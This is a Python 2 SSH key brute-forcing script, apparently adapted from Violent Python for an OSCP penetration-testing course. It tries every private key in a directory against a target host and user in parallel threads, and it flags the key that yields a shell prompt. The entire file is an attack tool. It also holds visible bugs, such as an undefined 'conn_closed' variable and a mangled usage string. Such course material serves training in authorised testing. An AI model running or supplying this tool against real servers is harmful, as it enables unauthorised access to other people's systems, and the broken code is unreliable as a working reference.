#!/usr/bin/python

# Pythonic SSHv1 Key Bruter from Violent Python.
# For use in the OSCP class Penetration Testing with Kali Linux
# Chang Tan Lister

import pexpect, optparse, os
from threading import *
maxConnections=5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop=False
Fails=0
def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = "Permission Denied"
        ssh_newkey = 'Are you sure you want to continue'
        opt = ' -o PasswordAuthentication=no'
        connStr = "ssh " + user + '@' + host + ' -i' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$','#',])
        if ret == 2:
            print '[-] Adding host to ~/.ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print '[-] Connection closed by remote host'
            Fails += 1
        elif ret > 4:
            print '[+] Success. ' + str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prof -H ' + '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d',dest='passDir',type='string',help='specific directory with keys')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)
    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting key found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too many connections closed by remote host'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir,filename)
        print '[-] Testing keyfile {}'.format(str(fullpath))
        t = Thread(target=connect,args=(user,host,fullpath,True))
        child=t.start()

if __name__ == '__main__':
    main()